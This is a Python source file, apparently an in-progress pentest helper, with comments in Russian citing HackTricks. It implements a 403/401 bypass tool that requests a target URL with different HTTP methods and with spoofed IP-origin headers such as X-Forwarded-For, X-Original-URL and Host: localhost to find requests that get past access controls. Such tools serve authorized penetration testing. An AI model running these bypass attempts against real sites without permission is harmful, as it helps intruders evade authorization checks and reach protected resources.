import requests



# sources
# https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html
# https://medium.com/infosecmatrix/mastering-403-bypass-techniques-a-penetration-testers-guide-f3a1cb16b9a3 - тут больше идей

# ideas
# менять методы et-post-put-patch yep
# добавлять заголовки yep
# path фаззить
# или параметры
# пробовать url_encode
# http -> https

class Bypass:
    def __init__(self, url):
        self.url = url

    def methods_brute(self, method:str):
        response = []
        match method:
            case 'POST':
                response.append(requests.post(self.url).status_code)
                response.append(f'-X POST {self.url}')
                return response
            case 'GET':
                response.append(requests.get(self.url).status_code)
                response.append(f'-X GET {self.url}')
                return response
            case 'PUT':
                response.append(requests.put(self.url).status_code)
                response.append(f'-X PUT {self.url}')
                return response
            case 'PATCH':
                response.append(requests.patch(self.url).status_code)
                response.append(f'-X PATCH {self.url}')
                return response

    def headers_brute(self):
        headers = [{"X-Originating-IP": "127.0.0.1"},
                   {"X-Forwarded-For": "127.0.0.1"},
                   {"X-Forwarded": "127.0.0.1"},
                   {"Forwarded-For": "127.0.0.1"},
                   {"X-Remote-IP": "127.0.0.1"},
                   {"X-Remote-Addr": "127.0.0.1"},
                   {"X-ProxyUser-Ip": "127.0.0.1"},
                   {"X-Original-URL": "127.0.0.1"},
                   {"Client-IP": "127.0.0.1"},
                   {"True-Client-IP": "127.0.0.1"},
                   {"Cluster-Client-IP": "127.0.0.1"},
                   {"X-ProxyUser-Ip": "127.0.0.1"},
                   {"Host": "localhost"}]
        response = [[] for i in range(len(headers))]
        for i in range(len(headers)):
            response[i].append(requests.get(self.url, headers=headers[i]).status_code)
            response[i].append(f'{self.url} -H {str(headers[i])[1:-1]} ')
        return response

